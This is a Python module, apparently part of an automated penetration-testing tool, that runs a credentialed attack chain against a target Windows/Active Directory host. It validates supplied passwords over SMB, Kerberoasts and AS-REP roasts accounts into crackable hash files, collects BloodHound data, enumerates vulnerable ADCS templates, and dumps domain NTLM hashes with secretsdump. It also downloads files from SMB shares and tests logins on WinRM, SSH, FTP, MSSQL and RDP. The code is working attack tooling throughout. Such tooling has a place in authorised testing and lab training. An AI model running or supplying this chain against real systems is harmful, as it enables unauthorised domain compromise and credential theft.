from __future__ import annotations

import subprocess
from pathlib import Path

from lib.findings import Findings, ServiceBuffer
from lib.models import Service
from lib.runner import Runner
from lib.workspace import Workspace


# ── Helpers ───────────────────────────────────────────────────────────────────

def _trim(text: str, lines: int = 60) -> str:
    ls = text.strip().splitlines()
    return "\n".join(ls[:lines]) + ("\n…" if len(ls) > lines else "")


def _has_signal(text: str) -> bool:
    """Return True if text contains meaningful findings beyond tool headers."""
    noise_prefixes = ("[*]", "[INFO]", "INFO:", "WARNING:", "Impacket v", "SMBMap -")
    return any(
        line.strip() and not line.strip().startswith(noise_prefixes)
        for line in text.strip().splitlines()
    )


def _error_lines(text: str) -> str:
    """Extract only error/warning lines from output."""
    return "\n".join(
        line for line in text.strip().splitlines()
        if any(m in line for m in ("[!]", "ERROR", "error:", "FAIL", "Could not", "strongerAuth"))
    )


# ── Credential loading ────────────────────────────────────────────────────────

def load_creds(
    username: str | None,
    password: str | None,
    creds_file: str | None,
) -> list[tuple[str, str]]:
    pairs: list[tuple[str, str]] = []
    if username and password:
        pairs.append((username, password))
    if creds_file:
        p = Path(creds_file)
        if not p.exists():
            print(f"[!] Creds file not found: {creds_file}")
        else:
            for line in p.read_text().splitlines():
                line = line.strip()
                if ":" in line and not line.startswith("#"):
                    user, _, pw = line.partition(":")
                    pairs.append((user.strip(), pw.strip()))
    seen: set[tuple[str, str]] = set()
    return [pair for pair in pairs if not (pair in seen or seen.add(pair))]  # type: ignore[func-returns-value]


# ── SMB credential validation ─────────────────────────────────────────────────

def _validate_smb(
    ip: str,
    creds: list[tuple[str, str]],
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    available: set[str],
) -> tuple[list[tuple[str, str]], list[tuple[str, str]]]:
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping SMB credential validation")
        return [], []

    findings.h3("Credential Validation — SMB")
    valid: list[tuple[str, str]] = []
    admin: list[tuple[str, str]] = []
    rows: list[list[str]] = []

    for user, pw in creds:
        cmd = ["nxc", "smb", ip, "-u", user, "-p", pw, "--no-bruteforce"]
        out = runner.run(cmd, f"creds_smb_val_{user}", timeout=30)
        if "Pwn3d!" in out:
            status = "VALID (ADMIN)"
            ws.add_valid_cred(user, pw, "SMB")
            findings.add_summary(f"Admin SMB creds: `{user}`")
            valid.append((user, pw))
            admin.append((user, pw))
            print(f"    [+] {user}: ADMIN on SMB")
        elif "[+]" in out:
            status = "VALID"
            ws.add_valid_cred(user, pw, "SMB")
            valid.append((user, pw))
            print(f"    [+] {user}: valid SMB")
        else:
            status = "invalid"
            print(f"    [-] {user}: invalid SMB")
        rows.append([user, pw[:2] + "***", status])

    findings.table(["User", "Password", "SMB"], rows)
    return valid, admin


# ── AD Core ───────────────────────────────────────────────────────────────────

def _ad_core(
    ip: str,
    domain: str,
    user: str,
    pw: str,
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    available: set[str],
    admin_smb: list[tuple[str, str]] | None = None,
) -> None:
    findings.h3("AD Core Enumeration")

    # 1. ldapdomaindump — authenticated full domain dump; LDAPS fallback if LDAP requires TLS
    if "ldapdomaindump" in available:
        out_dir = str(ws.loot_dir / "ldapdomaindump")
        cmd = [
            "ldapdomaindump",
            "-u", f"{domain}\\{user}",
            "-p", pw,
            "--no-json", "--no-grep",
            "-o", out_dir,
            f"ldap://{ip}",
        ]
        print(f"    [*] ldapdomaindump...")
        findings.h4("LDAP Domain Dump")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_ldapdomaindump", timeout=120)
        errors = _error_lines(out)
        if errors:
            findings.code_block(errors)
            if "strongerAuthRequired" in out or "Could not bind" in out:
                cmd_ldaps = cmd[:-1] + [f"ldaps://{ip}"]
                findings.cmd(" ".join(cmd_ldaps))
                print(f"    [*] LDAP requires TLS — retrying with LDAPS...")
                out2 = runner.run(cmd_ldaps, "creds_ldapdomaindump_ldaps", timeout=120)
                errors2 = _error_lines(out2)
                if errors2:
                    findings.code_block(errors2)
                    print(f"    [!] ldapdomaindump failed (LDAP + LDAPS)")
                else:
                    findings.bullet(f"Full dump saved to `loot/ldapdomaindump/`")
                    print(f"    [+] ldapdomaindump (LDAPS) complete")
            else:
                print(f"    [!] ldapdomaindump error")
        else:
            findings.bullet(f"Full dump saved to `loot/ldapdomaindump/`")
            print(f"    [+] ldapdomaindump complete")

    # 2. Kerberoasting — SPN accounts → crackable hashes
    if "impacket-GetUserSPNs" in available:
        cmd = [
            "impacket-GetUserSPNs",
            f"{domain}/{user}:{pw}",
            "-dc-ip", ip,
            "-request",
        ]
        print(f"    [*] Kerberoasting (GetUserSPNs)...")
        findings.h4("Kerberoasting (GetUserSPNs)")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_getuserspns", timeout=60)
        hashes = [line for line in out.splitlines() if "$krb5tgs$" in line]
        if hashes:
            added = ws.append_hash_file("kerberoast.hash", hashes)
            findings.bullet(f"**{len(hashes)} Kerberoastable hashes** ({added} new) → `loot/kerberoast.hash`")
            findings.add_summary(f"{len(hashes)} Kerberoastable accounts — crack with hashcat -m 13100")
            print(f"    [+] {len(hashes)} Kerberoastable hashes ({added} new)")
        else:
            if "error" in out.lower():
                findings.code_block(_trim(out))
            else:
                findings.bullet("No Kerberoastable SPNs found")
            print(f"    [-] No Kerberoastable SPNs")

    # 3. AS-REP roasting — authenticated enumeration (no -all flag; creds give full user list)
    if "impacket-GetNPUsers" in available:
        users_file = ws.loot_dir / "users.txt"
        if users_file.exists():
            cmd = [
                "impacket-GetNPUsers",
                f"{domain}/",
                "-dc-ip", ip,
                "-no-pass",
                "-request",
                "-usersfile", str(users_file),
            ]
        else:
            cmd = [
                "impacket-GetNPUsers",
                f"{domain}/{user}:{pw}",
                "-dc-ip", ip,
                "-request",
            ]
        print(f"    [*] AS-REP roasting (GetNPUsers)...")
        findings.h4("AS-REP Roasting (GetNPUsers)")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_getnpusers_auth", timeout=60)
        hashes = [line for line in out.splitlines() if "$krb5asrep$" in line]
        if hashes:
            added = ws.append_hash_file("asrep.hash", hashes)
            findings.bullet(f"**{len(hashes)} AS-REP hashes** ({added} new) → `loot/asrep.hash`")
            findings.add_summary(f"{len(hashes)} AS-REP roastable accounts — crack with hashcat -m 18200")
            print(f"    [+] {len(hashes)} AS-REP hashes ({added} new)")
        else:
            if "KRB5" in out or "error" in out.lower():
                findings.code_block(_trim(out))
            else:
                findings.bullet("No AS-REP roastable accounts found")
            print(f"    [-] No AS-REP roastable accounts")

    # 4. BloodHound collection — use -ns for DNS resolution instead of -dc IP
    if "bloodhound-python" in available:
        bh_dir = str(ws.bloodhound_dir)
        cmd = [
            "bloodhound-python",
            "-c", "All",
            "-u", user,
            "-p", pw,
            "-d", domain,
            "--dns-tcp",
            "--zip",
            "-o", bh_dir,
            "-ns", ip,
        ]
        print(f"    [*] BloodHound collection...")
        findings.h4("BloodHound Collection")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_bloodhound", timeout=300)
        zips = list(Path(bh_dir).glob("*.zip"))
        if zips:
            findings.bullet(f"**BloodHound data** → `loot/bloodhound/{zips[0].name}`")
            findings.add_summary("BloodHound collection complete — import zip into BloodHound GUI")
            print(f"    [+] BloodHound zip: {zips[0].name}")
        else:
            errors = _error_lines(out)
            findings.code_block(errors or _trim(out, lines=20))
            print(f"    [!] BloodHound collection failed")

    # 5. ADCS template enumeration
    if "certipy" in available:
        cmd = [
            "certipy", "find",
            "-u", f"{user}@{domain}",
            "-p", pw,
            "-dc-ip", ip,
            "-stdout",
        ]
        print(f"    [*] ADCS (certipy)...")
        findings.h4("ADCS Templates (certipy)")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_certipy", timeout=120)
        findings.code_block(_trim(out))
        if "ESC" in out:
            for line in out.splitlines():
                if "ESC" in line:
                    findings.add_summary(f"ADCS vuln: {line.strip()}")
            print(f"    [+] Vulnerable ADCS template found")
        else:
            print(f"    [-] No vulnerable ADCS templates")

    # 6. secretsdump — extract NTLM hashes (requires admin/DA credentials)
    if "impacket-secretsdump" in available and admin_smb:
        admin_user, admin_pw = admin_smb[0]
        cmd = [
            "impacket-secretsdump",
            f"{domain}/{admin_user}:{admin_pw}@{ip}",
            "-just-dc-ntlm",
        ]
        print(f"    [*] secretsdump (admin creds: {admin_user})...")
        findings.h4("NTLM Hash Dump (secretsdump)")
        findings.cmd(f"impacket-secretsdump {domain}/{admin_user}:***@{ip} -just-dc-ntlm")
        out = runner.run(cmd, "creds_secretsdump", timeout=300)
        hashes = [l for l in out.splitlines() if ":::" in l and not l.startswith("[")]
        if hashes:
            added = ws.append_hash_file("ntlm.hash", hashes)
            findings.bullet(f"**{len(hashes)} NTLM hashes** ({added} new) → `loot/ntlm.hash`")
            findings.add_summary(f"{len(hashes)} NTLM hashes dumped — crack with hashcat -m 1000 or pass-the-hash")
            print(f"    [+] {len(hashes)} NTLM hashes dumped ({added} new)")
        else:
            errors = _error_lines(out)
            if errors:
                findings.code_block(errors)
            print(f"    [!] secretsdump returned no hashes")


# ── Per-service helpers ───────────────────────────────────────────────────────

def _smb_spider(
    ip: str, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    """Download interesting files from accessible SMB shares to loot/creds_smb/<user>/."""
    if "nxc" not in available:
        return
    smb_loot = ws.loot_dir / "creds_smb" / user
    smb_loot.mkdir(parents=True, exist_ok=True)
    cmd = [
        "nxc", "smb", ip,
        "-u", user, "-p", pw,
        "-M", "spider_plus",
        "-o", "DOWNLOAD_FLAG=True",
        f"OUTPUT_FOLDER={smb_loot}",
    ]
    findings.cmd(f"nxc smb {ip} -u {user} -p *** -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=loot/creds_smb/{user}/")
    runner.run(cmd, f"creds_smb_spider_{user}", timeout=180)
    files = [f for f in smb_loot.rglob("*") if f.is_file()]
    if files:
        findings.bullet(f"**{len(files)} files downloaded** → `loot/creds_smb/{user}/`")
        findings.add_summary(f"SMB files downloaded for {user}: {len(files)} files in loot/creds_smb/{user}/")
        print(f"      [+] {len(files)} SMB files downloaded → loot/creds_smb/{user}/")
    else:
        print(f"      [-] No files downloaded from SMB")


def _creds_smb(
    ip: str, port: int, domain: str | None, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    findings.h4(f"SMB — {user}")
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping SMB test")
        return
    cmd = ["nxc", "smb", ip, "-u", user, "-p", pw, "--shares"]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"creds_smb_shares_{user}", timeout=30)
    findings.code_block(_trim(out))
    if "READ" in out or "WRITE" in out:
        ws.add_valid_cred(user, pw, f"SMB:{port}")
        print(f"      [+] {user}: SMB shares readable — spidering...")
        _smb_spider(ip, user, pw, runner, findings, ws, available)


def _creds_winrm(
    ip: str, port: int, domain: str | None, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    findings.h4(f"WinRM — {user}")
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping WinRM test")
        return
    cmd = ["nxc", "winrm", ip, "-u", user, "-p", pw]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"creds_winrm_val_{user}", timeout=30)
    findings.code_block(_trim(out))
    if "[+]" in out:
        ws.add_valid_cred(user, pw, f"WinRM:{port}")
        findings.add_summary(f"WinRM access: `{user}` on port {port}")
        print(f"      [+] {user}: WinRM:{port} valid")
        for safe_cmd in ["whoami", "hostname"]:
            cmd2 = ["nxc", "winrm", ip, "-u", user, "-p", pw, "-x", safe_cmd]
            findings.cmd(" ".join(cmd2))
            out2 = runner.run(cmd2, f"creds_winrm_{safe_cmd}_{user}", timeout=20)
            findings.code_block(_trim(out2))
    else:
        print(f"      [-] {user}: WinRM:{port} invalid")


def _creds_ssh(
    ip: str, port: int, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace,
) -> None:
    findings.h4(f"SSH — {user}")
    full_cmd = [
        "sshpass", "-p", pw,
        "ssh",
        "-o", "BatchMode=no",
        "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=8",
        "-o", "PasswordAuthentication=yes",
        "-p", str(port),
        f"{user}@{ip}",
        "whoami; hostname; id",
    ]
    findings.cmd(f"sshpass -p *** ssh -p {port} {user}@{ip} 'whoami; hostname; id'")
    out = runner.run(full_cmd, f"creds_ssh_{user}", timeout=20)
    findings.code_block(_trim(out))
    if out.strip() and "Permission denied" not in out and "Authentication failed" not in out:
        ws.add_valid_cred(user, pw, f"SSH:{port}")
        findings.add_summary(f"SSH access: `{user}` on port {port}")
        print(f"      [+] {user}: SSH:{port} valid")
    else:
        print(f"      [-] {user}: SSH:{port} invalid")


def _creds_ftp(
    ip: str, port: int, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace,
) -> None:
    findings.h4(f"FTP — {user}")
    findings.cmd(f"curl -sk ftp://{ip}:{port}/ --user {user}:*** -l")
    try:
        result = subprocess.run(
            ["curl", "-sk", f"ftp://{ip}:{port}/", "--user", f"{user}:{pw}",
             "--connect-timeout", "10", "-l"],
            capture_output=True, text=True, timeout=15,
        )
    except subprocess.TimeoutExpired:
        findings.note(f"FTP connection timed out for `{user}`")
        return
    if result.returncode == 0:
        ws.add_valid_cred(user, pw, f"FTP:{port}")
        findings.add_summary(f"FTP access: `{user}` on port {port}")
        findings.bullet("**FTP login successful**")
        print(f"      [+] {user}: FTP:{port} valid")
        if result.stdout.strip():
            findings.code_block(result.stdout.strip())
        else:
            findings.bullet("(empty directory listing)")
    else:
        findings.note(f"FTP login failed for `{user}` (exit {result.returncode})")
        print(f"      [-] {user}: FTP:{port} invalid")


def _creds_mssql(
    ip: str, port: int, domain: str | None, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    findings.h4(f"MSSQL — {user}")
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping MSSQL test")
        return
    cmd = ["nxc", "mssql", ip, "-u", user, "-p", pw, "--port", str(port),
           "-q", "SELECT name FROM master..sysdatabases"]
    if domain:
        cmd += ["-d", domain]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"creds_mssql_{user}", timeout=30)
    findings.code_block(_trim(out))
    if "[+]" in out:
        ws.add_valid_cred(user, pw, f"MSSQL:{port}")
        findings.add_summary(f"MSSQL access: `{user}` on port {port}")
        print(f"      [+] {user}: MSSQL:{port} valid")
    else:
        print(f"      [-] {user}: MSSQL:{port} invalid")


def _creds_rdp(
    ip: str, port: int, domain: str | None, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    findings.h4(f"RDP — {user}")
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping RDP test")
        return
    cmd = ["nxc", "rdp", ip, "-u", user, "-p", pw, "--port", str(port)]
    if domain:
        cmd += ["-d", domain]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"creds_rdp_{user}", timeout=30)
    findings.code_block(_trim(out))
    if "[+]" in out:
        ws.add_valid_cred(user, pw, f"RDP:{port}")
        findings.add_summary(f"RDP access: `{user}` on port {port}")
        print(f"      [+] {user}: RDP:{port} valid")
    else:
        print(f"      [-] {user}: RDP:{port} invalid")


# ── Per-service dispatcher ────────────────────────────────────────────────────

_SERVICE_HANDLERS: dict[int, str] = {
    21:   "ftp",
    22:   "ssh",
    139:  "smb",
    445:  "smb",
    1433: "mssql",
    3389: "rdp",
    5985: "winrm",
    5986: "winrm",
}

_NAME_HANDLERS: dict[str, str] = {
    "ftp":          "ftp",
    "ssh":          "ssh",
    "microsoft-ds": "smb",
    "netbios":      "smb",
    "ms-sql":       "mssql",
    "rdp":          "rdp",
    "winrm":        "winrm",
}


def _enumerate_services(
    ip: str,
    domain: str | None,
    creds: list[tuple[str, str]],
    services: list[Service],
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    available: set[str],
) -> None:
    if not services:
        return
    findings.h3("Per-Service Credentialed Enumeration")

    seen_kinds: set[str] = set()
    for svc in services:
        kind = _SERVICE_HANDLERS.get(svc.port)
        if kind is None:
            for pat, k in _NAME_HANDLERS.items():
                if pat in svc.name.lower():
                    kind = k
                    break
        if kind is None:
            continue
        # Deduplicate: only enumerate each kind once (e.g. SMB on both 139 and 445)
        dedup_key = f"{kind}:{svc.port}"
        if dedup_key in seen_kinds:
            continue
        seen_kinds.add(dedup_key)

        buf = ServiceBuffer(svc.port, svc.proto)
        buf.h3(f"TCP {svc.port} — {svc.name.upper()} (credentialed)")
        print(f"    [*] {kind.upper()} {ip}:{svc.port} — testing {len(creds)} credential(s)...")

        for user, pw in creds:
            if kind == "smb":
                _creds_smb(ip, svc.port, domain, user, pw, runner, buf, ws, available)
            elif kind == "winrm":
                _creds_winrm(ip, svc.port, domain, user, pw, runner, buf, ws, available)
            elif kind == "ssh":
                _creds_ssh(ip, svc.port, user, pw, runner, buf, ws)
            elif kind == "ftp":
                _creds_ftp(ip, svc.port, user, pw, runner, buf, ws)
            elif kind == "mssql":
                _creds_mssql(ip, svc.port, domain, user, pw, runner, buf, ws, available)
            elif kind == "rdp":
                _creds_rdp(ip, svc.port, domain, user, pw, runner, buf, ws, available)

        findings.flush_service_buffer(buf)


# ── Main entry ────────────────────────────────────────────────────────────────

def run_creds_mode(
    ip: str,
    domain: str | None,
    creds: list[tuple[str, str]],
    services: list[Service],
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    available: set[str],
) -> None:
    findings.h2("Credentialed Enumeration")

    if not creds:
        findings.note("No credentials provided.")
        return

    cred_list = ", ".join(f"`{u}`" for u, _ in creds)
    findings.bullet(f"Testing {len(creds)} credential set(s): {cred_list}")
    print(f"[*] Creds mode — {len(creds)} pair(s): {', '.join(u for u, _ in creds)}")

    # Phase 1: Validate all creds against SMB (fast, works without domain)
    print(f"\n[*] Phase 1: SMB credential validation...")
    valid_smb, admin_smb = _validate_smb(ip, creds, runner, findings, ws, available)
    print(f"    {len(valid_smb)} valid / {len(creds)} tested  ({len(admin_smb)} admin)")

    # Phase 2: AD core with best available cred (prefer validated, fall back to first provided)
    if domain:
        user, pw = valid_smb[0] if valid_smb else creds[0]
        print(f"\n[*] Phase 2: AD core enumeration as {user}@{domain}...")
        _ad_core(ip, domain, user, pw, runner, findings, ws, available, admin_smb)
    else:
        findings.note("No `--domain` specified — skipping AD core enumeration")
        print("[!] No --domain — skipping AD core enumeration")

    # Phase 3: Per-service credentialed enumeration against discovered services
    print(f"\n[*] Phase 3: Per-service enumeration ({len(services)} service(s))...")
    _enumerate_services(ip, domain, creds, services, runner, findings, ws, available)

    print(f"\n[+] Creds mode complete — {ws.findings_path}")
